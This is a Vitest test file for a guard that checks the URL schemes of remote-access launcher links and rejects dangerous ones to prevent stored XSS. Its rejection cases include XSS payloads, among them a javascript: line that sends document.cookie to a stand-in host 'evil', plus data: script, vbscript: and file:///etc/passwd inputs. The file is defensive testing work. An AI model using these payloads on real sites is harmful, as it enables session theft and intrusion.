import { describe, it, expect } from 'vitest';
import {
  ALLOWED_LAUNCHER_SCHEMES,
  DISALLOWED_LAUNCHER_SCHEMES,
  isAllowedLauncherScheme,
} from './remoteAccessLauncherScheme';

describe('isAllowedLauncherScheme', () => {
  it('keeps the allowlist and the dangerous denylist disjoint', () => {
    // Load-bearing invariant: the allowlist short-circuits before the denylist,
    // so a scheme on BOTH lists would be silently un-blocked — reintroducing the
    // exact XSS vector this guard exists to prevent. The denylist is the floor.
    for (const scheme of ALLOWED_LAUNCHER_SCHEMES) {
      expect(DISALLOWED_LAUNCHER_SCHEMES.has(scheme)).toBe(false);
    }
  });

  it('exposes the known-good scheme allowlist', () => {
    // The guard is allowlist-first: these well-known remote-access (and web)
    // schemes are explicitly permitted. The set is exported so the client can
    // reuse it for inline hints.
    expect(ALLOWED_LAUNCHER_SCHEMES).toEqual(
      new Set(['https', 'http', 'rustdesk', 'teamviewer', 'anydesk', 'splashtop', 'screenconnect']),
    );
  });

  it('accepts every scheme on the known-good allowlist', () => {
    for (const scheme of ALLOWED_LAUNCHER_SCHEMES) {
      expect(isAllowedLauncherScheme(`${scheme}://host/{id}`)).toBe(true);
    }
  });

  it('accepts known-safe remote-access schemes', () => {
    expect(isAllowedLauncherScheme('rustdesk://{id}?password={password}')).toBe(true);
    expect(isAllowedLauncherScheme('teamviewer://{id}')).toBe(true);
    expect(isAllowedLauncherScheme('anydesk://{id}')).toBe(true);
    expect(isAllowedLauncherScheme('splashtop://{id}')).toBe(true);
    expect(isAllowedLauncherScheme('https://acme.example.com/Host#Access///{id}/Join')).toBe(true);
    expect(isAllowedLauncherScheme('http://127.0.0.1:42/{id}')).toBe(true);
    expect(isAllowedLauncherScheme('breeze://connect?id={id}')).toBe(true);
    expect(isAllowedLauncherScheme('bdunn-rustremote://{id}')).toBe(true);
  });

  it('still accepts custom (off-allowlist) schemes that are not dangerous', () => {
    // Non-breaking: partner-configured custom protocols outside the allowlist
    // remain allowed as long as they are not on the dangerous denylist.
    expect(isAllowedLauncherScheme('breeze://connect?id={id}')).toBe(true);
    expect(isAllowedLauncherScheme('bdunn-rustremote://{id}')).toBe(true);
    expect(isAllowedLauncherScheme('my-custom-tool://{id}')).toBe(true);
  });

  it('rejects javascript: in any case (stored XSS via partner-admin)', () => {
    expect(isAllowedLauncherScheme('javascript:alert(1)')).toBe(false);
    expect(isAllowedLauncherScheme('JavaScript:alert(1)')).toBe(false);
    expect(isAllowedLauncherScheme('JAVASCRIPT:alert(1)')).toBe(false);
    expect(isAllowedLauncherScheme('javascript:fetch("//evil/?c="+document.cookie+"_{id}")')).toBe(false);
  });

  it('rejects other dangerous schemes', () => {
    expect(isAllowedLauncherScheme('data:text/html,<script>alert(1)</script>')).toBe(false);
    expect(isAllowedLauncherScheme('vbscript:msgbox(1)')).toBe(false);
    expect(isAllowedLauncherScheme('file:///etc/passwd')).toBe(false);
    expect(isAllowedLauncherScheme('about:blank')).toBe(false);
    expect(isAllowedLauncherScheme('chrome://settings')).toBe(false);
    expect(isAllowedLauncherScheme('jar:file:///foo!/bar')).toBe(false);
    expect(isAllowedLauncherScheme('blob:https://x/abc')).toBe(false);
    expect(isAllowedLauncherScheme('view-source:https://x')).toBe(false);
    expect(isAllowedLauncherScheme('filesystem:https://x/foo')).toBe(false);
  });

  it('rejects strings with no scheme', () => {
    expect(isAllowedLauncherScheme('')).toBe(false);
    expect(isAllowedLauncherScheme('//acme.example.com/{id}')).toBe(false);
    expect(isAllowedLauncherScheme('{id}')).toBe(false);
    expect(isAllowedLauncherScheme('rustdesk{id}')).toBe(false);
  });
});
